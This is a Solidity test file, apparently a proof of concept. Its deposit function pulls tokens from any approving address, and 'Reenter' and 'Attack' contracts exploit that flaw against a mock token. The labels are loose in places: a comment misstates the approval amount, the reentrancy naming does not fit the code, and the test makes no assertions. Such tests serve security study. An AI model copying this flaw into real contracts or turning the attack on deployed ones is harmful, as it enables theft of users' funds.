// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Base} from "test/Base.t.sol";
import {Token} from "test/mocks/Token.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract A {
    IERC20 token;

    mapping(address => uint256) public deposits;

    constructor(address _token) {
        token = IERC20(_token);
    }

    // function deposit is not protected
    function deposit(uint256 amount, address account) external {
        token.transferFrom(account, address(this), amount);
        deposits[account] += amount;
    }
}

contract Reenter {
    A victim;

    constructor(address _victim) {
        victim = A(_victim);
    }

    function _attack(uint256 amount) internal {
        victim.deposit(amount, msg.sender);
    }

    receive() external payable {
        _attack(1000e18);
    }
}

// attacker contract
contract Attack {
    A victim;
    Reenter reenter;

    constructor(address _victim, address _reenter) {
        victim = A(_victim);
        reenter = Reenter(payable(_reenter));
    }

    // call it on this function which sends ether to a contract with
    // a callback that reenters
    function callDeposit(uint256 amount) external {
        (bool ok,) = payable(reenter).call{value: 1}("");
        require(ok, "failed");

        victim.deposit(amount, msg.sender);
    }
}

contract ReenterTest is Base {
    A a;
    Reenter reenter;
    Attack attack;
    Token token;

    address _user = address(0x287494);

    function setUp() external {
        token = new Token("Token", "TKN");

        a = new A(address(token));
        reenter = new Reenter(address(a));
        attack = new Attack(address(a), address(reenter));

        // deal ether to the attack contract
        vm.deal(address(attack), 1000);
    }

    function testWorks() external {
        // user only approves 1000e18
        token.mint(_user, 2000e18);

        token.mint(address(attack), 1000e18);
        vm.prank(address(attack));
        token.approve(address(a), 2000e18);

        vm.startPrank(_user);
        token.approve(address(a), 2000e18);
        attack.callDeposit(1000e18);
        vm.stopPrank();
    }
}
